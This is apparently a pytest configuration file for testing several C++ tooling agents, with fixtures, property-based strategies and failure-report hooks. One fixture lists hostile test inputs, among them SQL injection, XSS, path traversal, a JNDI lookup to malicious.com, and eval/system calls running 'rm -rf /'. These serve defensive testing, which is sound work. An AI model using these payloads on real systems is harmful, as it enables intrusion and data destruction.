"""Enhanced configuration for deep validation testing across all agents."""

import pytest
import asyncio
import sys
import os
from pathlib import Path
from unittest.mock import Mock, AsyncMock
from typing import Any, Dict, List, Optional
import tempfile
import json
import time

# Configure Hypothesis for deep probing
from hypothesis import settings, strategies as st
settings.register_profile("deep_validation", max_examples=500, deadline=None)
settings.load_profile("deep_validation")

# Add all agent directories to Python path for testing
agent_dirs = [
    Path(__file__).parent / "clang_tidy_ai_agent",
    Path(__file__).parent / "blitzfire_cpp_optimizer", 
    Path(__file__).parent / "never_fail_build_resolver",
    Path(__file__).parent / "valgrind_memory_ai_agent",
    Path(__file__).parent / "valgrind_ai_agent",
]

for agent_dir in agent_dirs:
    if agent_dir.exists():
        sys.path.insert(0, str(agent_dir))

@pytest.fixture(scope="session")
def event_loop():
    """Create an event loop for the test session."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
def mock_pydantic_ai_model():
    """Create a mock Pydantic AI model for testing."""
    try:
        from pydantic_ai.models.test import TestModel
        from pydantic_ai.messages import ModelTextResponse
        
        model = TestModel()
        model.agent_responses = [
            ModelTextResponse(content="Deep validation test response")
        ]
        return model
    except ImportError:
        # Fallback mock for when pydantic-ai is not available
        model = Mock()
        model.agent_responses = []
        return model

@pytest.fixture
def mock_agent_dependencies():
    """Create mock agent dependencies for testing."""
    deps = Mock()
    deps.api_key = "test_key"
    deps.session_id = "test_session_123"
    deps._probe_log = []
    deps.user_preferences = {"optimization_level": "standard"}
    return deps

@pytest.fixture
def probed_agent_base():
    """Base probed agent fixture with instrumentation."""
    agent = Mock()
    agent._probe_log = []
    agent._execution_metrics = {}
    agent._state_changes = []
    
    original_run = AsyncMock(return_value=Mock(data="Test agent response"))
    
    async def probed_run(*args, **kwargs):
        start_time = time.time()
        agent._probe_log.append(f"Agent execution started: {args[0][:30] if args else 'no args'}...")
        
        try:
            result = await original_run(*args, **kwargs)
            end_time = time.time()
            agent._execution_metrics['last_run_time'] = end_time - start_time
            agent._probe_log.append(f"Agent execution completed in {end_time - start_time:.3f}s")
            return result
        except Exception as e:
            agent._probe_log.append(f"Agent execution failed: {type(e).__name__}: {e}")
            raise
    
    agent.run = probed_run
    return agent

@pytest.fixture
def temp_test_file():
    """Create a temporary test file for file-based testing."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.cpp', delete=False) as f:
        f.write("""
#include <iostream>
#include <vector>

int main() {
    std::vector<int> data(1000);
    for(int i = 0; i < 1000; i++) {
        data[i] = i * 2;
        std::cout << data[i] << std::endl;
    }
    return 0;
}
        """)
        yield f.name
    os.unlink(f.name)

@pytest.fixture
def security_test_inputs():
    """Provide common malicious inputs for security testing."""
    return [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://malicious.com/evil}",
        "{{config.items()}}",
        "eval('import os; os.system(\"rm -rf /\")')",
        "\x00\x01\x02\x03",  # Binary data
        "A" * 10000,  # Buffer overflow attempt
        "system('rm -rf /')",
        "__import__('os').system('malicious')",
    ]

@pytest.fixture
def performance_test_scenarios():
    """Provide performance test scenarios."""
    return [
        {"name": "small_input", "size": 100, "expected_time": 1.0},
        {"name": "medium_input", "size": 1000, "expected_time": 2.0},
        {"name": "large_input", "size": 10000, "expected_time": 5.0},
        {"name": "xlarge_input", "size": 100000, "expected_time": 10.0},
    ]

@pytest.fixture
def edge_case_inputs():
    """Provide edge case inputs for boundary testing."""
    return [
        "",  # Empty input
        " ",  # Whitespace only
        "\n\t\r",  # Special whitespace
        "test" * 1000,  # Very long input
        "🚀🔥⚡",  # Unicode emoji
        "αβγδε",  # Unicode characters
        None,  # Null input
        {"complex": "object"},  # Complex object
        [1, 2, 3],  # List input
        123,  # Numeric input
    ]

@pytest.fixture
def validation_metrics():
    """Track validation metrics across tests."""
    metrics = {
        "tests_run": 0,
        "tests_passed": 0,
        "tests_failed": 0,
        "coverage_achieved": 0.0,
        "security_tests_passed": 0,
        "performance_tests_passed": 0,
        "property_based_tests_passed": 0,
    }
    return metrics

# Property-based testing strategies for all agents
@pytest.fixture
def hypothesis_strategies():
    """Provide Hypothesis strategies for property-based testing."""
    return {
        "text_input": st.text(min_size=1, max_size=1000),
        "code_input": st.text(
            alphabet=st.characters(whitelist_categories=('Lu', 'Ll', 'Nd', 'Pc', 'Pd', 'Po', 'Ps', 'Pe', 'Zs')),
            min_size=10, 
            max_size=5000
        ),
        "file_paths": st.lists(
            st.text(min_size=1, max_size=50, alphabet=st.characters(min_codepoint=32, max_codepoint=126)),
            min_size=1,
            max_size=20
        ),
        "optimization_levels": st.sampled_from(['standard', 'aggressive', 'extreme', 'custom']),
        "error_types": st.sampled_from([
            'compiler error', 'linker error', 'cmake error', 'dependency missing',
            'configuration error', 'test failure', 'warning as error', 'build timeout'
        ]),
        "integers": st.integers(min_value=1, max_value=1000000),
        "floats": st.floats(min_value=0.1, max_value=1000.0, allow_nan=False, allow_infinity=False),
    }

# Test configuration and reporting hooks
@pytest.hookimpl(hookwrapper=True)
def pytest_runtest_makereport(item, call):
    """Enhanced test reporting with fix step generation."""
    outcome = yield
    report = outcome.get_result()
    
    if call.when == 'call' and report.failed:
        # Generate fix steps for failures
        fix_steps = generate_fix_steps(item, report)
        report.fix_steps = fix_steps
        
        # Log failure details for deep validation
        print(f"\nDEEP VALIDATION FAILURE ANALYSIS:")
        print(f"Test: {item.name}")
        print(f"Location: {item.location}")
        print(f"Fix Steps: {fix_steps}")

def generate_fix_steps(item, report) -> Dict[str, Any]:
    """Generate structured fix steps for test failures."""
    fix_plan = {
        "what_failed": f"Test '{item.name}' failed",
        "where": f"{item.fspath}::{item.name}",
        "why": "Unknown root cause",
        "how_to_fix": [
            "1. Review test implementation and expectations",
            "2. Check agent/dependency mocking and setup",
            "3. Verify test data and inputs are valid",
            "4. Run test in isolation to confirm failure",
            "5. Apply specific fixes based on error type",
            "6. Re-run test suite to verify resolution"
        ]
    }
    
    # Analyze failure type and provide specific guidance
    if hasattr(report, 'longrepr') and report.longrepr:
        failure_text = str(report.longrepr).lower()
        
        if 'importerror' in failure_text or 'modulenotfounderror' in failure_text:
            fix_plan["why"] = "Missing import or dependency issue"
            fix_plan["how_to_fix"] = [
                "1. Check if required modules are installed",
                "2. Verify PYTHONPATH includes agent directories",
                "3. Add missing imports or install dependencies",
                "4. Update requirements.txt if needed",
                "5. Re-run test"
            ]
        elif 'attributeerror' in failure_text:
            fix_plan["why"] = "Missing method or attribute on mock/object"
            fix_plan["how_to_fix"] = [
                "1. Check mock object setup and configuration", 
                "2. Add missing methods/attributes to mocks",
                "3. Verify agent interface matches test expectations",
                "4. Update test to use correct method names",
                "5. Re-run test"
            ]
        elif 'assertionerror' in failure_text:
            fix_plan["why"] = "Test assertion failed - unexpected behavior"
            fix_plan["how_to_fix"] = [
                "1. Review assertion logic and expected values",
                "2. Check actual vs expected output",
                "3. Verify test scenario matches agent capabilities",
                "4. Update assertion or fix agent behavior",
                "5. Re-run test"
            ]
        elif 'timeout' in failure_text:
            fix_plan["why"] = "Test or operation timed out"
            fix_plan["how_to_fix"] = [
                "1. Increase timeout values in test configuration",
                "2. Optimize agent performance or mock responses",
                "3. Check for infinite loops or blocking operations",
                "4. Use async/await properly in test",
                "5. Re-run test"
            ]
    
    return fix_plan

@pytest.fixture
def deep_validation_config():
    """Configuration for deep validation testing."""
    return {
        "coverage_threshold": 98.0,
        "max_test_duration": 30.0,
        "concurrent_test_limit": 10,
        "security_test_enabled": True,
        "performance_test_enabled": True,
        "property_based_test_enabled": True,
        "hypothesis_max_examples": 500,
        "memory_limit_mb": 500,
        "failure_injection_enabled": True,
    }

@pytest.fixture(autouse=True)
def setup_deep_validation_environment():
    """Set up environment for deep validation testing."""
    # Ensure test environment is clean
    os.environ["TESTING"] = "true"
    os.environ["PYTEST_DEEP_VALIDATION"] = "enabled"
    
    # Configure logging for test debugging
    import logging
    logging.basicConfig(level=logging.DEBUG if os.getenv("DEBUG_TESTS") else logging.WARNING)
    
    yield
    
    # Cleanup after tests
    os.environ.pop("TESTING", None)
    os.environ.pop("PYTEST_DEEP_VALIDATION", None)

# Agent-specific fixtures for specialized testing
@pytest.fixture
def clang_tidy_test_environment():
    """Set up environment for clang-tidy agent testing."""
    return {
        "mock_clang_tidy_output": "test.cpp:42:1: warning: missing include guard",
        "mock_analysis_result": {"warnings": 1, "errors": 0, "suggestions": ["Add include guard"]},
        "test_cpp_code": "int main() { return 0; }",
    }

@pytest.fixture
def blitzfire_test_environment():
    """Set up environment for BLITZFIRE optimizer testing."""
    return {
        "optimization_levels": ["standard", "aggressive", "extreme"],
        "performance_domains": ["general", "io_intensive", "compute_intensive"],
        "mock_speedup_results": {"vectorization": 40, "buffering": 60, "alignment": 15},
        "test_optimization_code": "for(int i=0; i<1000000; i++) { std::cout << i << std::endl; }",
    }

@pytest.fixture
def build_resolver_test_environment():
    """Set up environment for build resolver testing."""
    return {
        "resolution_tiers": ["prevention", "intelligent", "comprehensive", "nuclear"],
        "build_problems": ["compiler error", "linker error", "cmake error", "dependency missing"],
        "mock_resolution_times": {"prevention": 0.1, "intelligent": 1.0, "comprehensive": 5.0, "nuclear": 20.0},
        "test_build_errors": [
            "error: 'undeclared_function' was not declared in this scope",
            "ld: library not found for -lmissing",
            "CMake Error: target not found"
        ],
    }

@pytest.fixture
def valgrind_test_environment():
    """Set up environment for Valgrind agent testing."""
    return {
        "valgrind_tools": ["memcheck", "helgrind", "drd", "massif", "cachegrind"],
        "mock_valgrind_output": "definitely lost: 1,024 bytes in 1 blocks",
        "test_binary_path": "/tmp/test_executable",
        "memory_issue_types": ["memory leak", "buffer overflow", "use after free", "double free"],
    }

# Performance monitoring utilities
class PerformanceMonitor:
    """Monitor test performance and resource usage."""
    
    def __init__(self):
        self.start_time = None
        self.end_time = None
        self.memory_usage = []
    
    def start(self):
        """Start performance monitoring."""
        self.start_time = time.time()
        try:
            import psutil
            import os
            process = psutil.Process(os.getpid())
            self.memory_usage = [process.memory_info().rss]
        except ImportError:
            pass
    
    def stop(self):
        """Stop performance monitoring and return metrics."""
        self.end_time = time.time()
        
        try:
            import psutil
            import os
            process = psutil.Process(os.getpid())
            self.memory_usage.append(process.memory_info().rss)
        except ImportError:
            pass
        
        return {
            "duration": self.end_time - self.start_time if self.start_time else 0,
            "memory_increase": self.memory_usage[-1] - self.memory_usage[0] if len(self.memory_usage) >= 2 else 0,
            "peak_memory": max(self.memory_usage) if self.memory_usage else 0,
        }

@pytest.fixture
def performance_monitor():
    """Provide performance monitoring for tests."""
    return PerformanceMonitor()

# Validation result tracking
class ValidationResultTracker:
    """Track validation results across test session."""
    
    def __init__(self):
        self.results = {
            "total_tests": 0,
            "passed_tests": 0,
            "failed_tests": 0,
            "security_tests": 0,
            "performance_tests": 0,
            "property_tests": 0,
            "coverage_achieved": 0.0,
            "critical_failures": [],
            "fix_steps_generated": [],
        }
    
    def record_test_result(self, test_name: str, passed: bool, test_type: str = "unit", fix_steps: Optional[Dict] = None):
        """Record a test result."""
        self.results["total_tests"] += 1
        if passed:
            self.results["passed_tests"] += 1
        else:
            self.results["failed_tests"] += 1
            if fix_steps:
                self.results["fix_steps_generated"].append(fix_steps)
        
        if test_type == "security":
            self.results["security_tests"] += 1
        elif test_type == "performance":
            self.results["performance_tests"] += 1
        elif test_type == "property":
            self.results["property_tests"] += 1
    
    def get_summary(self) -> Dict[str, Any]:
        """Get validation summary."""
        pass_rate = (self.results["passed_tests"] / self.results["total_tests"] * 100) if self.results["total_tests"] > 0 else 0
        
        return {
            **self.results,
            "pass_rate_percent": pass_rate,
            "deep_validation_score": min(100, pass_rate * 0.7 + self.results["coverage_achieved"] * 0.3),
            "production_ready": pass_rate >= 98 and self.results["coverage_achieved"] >= 98,
        }

@pytest.fixture(scope="session")
def validation_tracker():
    """Provide validation result tracking."""
    return ValidationResultTracker()